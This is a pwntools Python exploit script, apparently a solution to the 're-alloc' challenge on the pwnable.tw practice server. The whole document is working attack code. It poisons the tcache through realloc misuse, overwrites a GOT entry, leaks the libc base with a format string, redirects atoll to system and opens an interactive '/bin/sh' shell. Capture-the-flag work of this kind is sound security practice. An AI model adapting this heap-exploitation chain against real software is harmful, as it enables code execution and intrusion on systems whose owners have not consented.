from pwn import *

e = ELF("./re-alloc")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.29.so")

context.binary = e
context.terminal = ["konsole", "-e"]




def alloc(idx, size, data):
    p.sendlineafter(":", "1")
    p.sendlineafter(":", str(idx))
    p.sendlineafter(":", str(size))
    p.sendafter(":", data)
    


def realloc1(idx, size):
    p.sendlineafter(":", "2")
    p.sendlineafter(":", str(idx))
    p.sendlineafter(":", str(size))




def realloc2(idx, size, data):
    p.sendlineafter(":", "2")
    p.sendlineafter(":", str(idx))
    p.sendlineafter(":", str(size))
    p.sendafter(":", data)
    
    

def free(idx):
    p.sendlineafter(":", "3")
    p.sendlineafter(":", str(idx))
    

#p = process([ld.path, e.path], env={"LD_PRELOAD": libc.path})
p = remote("chall.pwnable.tw", 10106)

context.log_level="debug"
gdb.attach(p, """c""")




# tcache poison 0x20
alloc(1, 0x10, "BBBB")

realloc1(1, 0)

realloc2(1, 0x10, p64(e.got["atoll"]))

alloc(0, 0x10, "AAAA")


realloc2(1, 0x60, "CCCC")


free(1)


realloc2(0, 0x70, p64(e.got["atoll"]))

free(0)


# tcache poison 0x30
alloc(0, 0x20, "BBBB")

realloc1(0, 0)

realloc2(0, 0x20, p64(e.got["atoll"]))

alloc(1, 0x20, "AAAA")


realloc2(0, 0x60, "CCCC")


free(0)


realloc2(1, 0x70, p64(e.got["atoll"]))

free(1)



# leak libc
print("binary atoll", hex(e.got["atoll"]))
print("binary arr at", hex(0x004040b0))

alloc(0, 0x20, p64(e.plt["printf"]))


p.sendlineafter(":", "1")
p.sendafter(":", "%p %p |%p|")




# write system
p.recvuntil("|")
dat = p.recvuntil("|")[:-1]
libc.address = eval(dat) - 0x12e009


p.sendlineafter("choice:", "1")
p.sendafter(":", "A")
p.sendlineafter(":", "A"*15)

print("libc system", hex(libc.sym["system"]))
p.sendafter(":", p64(libc.sym["system"]))


p.sendlineafter(":", "1")
p.sendafter(":", "/bin/sh\x00")

p.interactive()








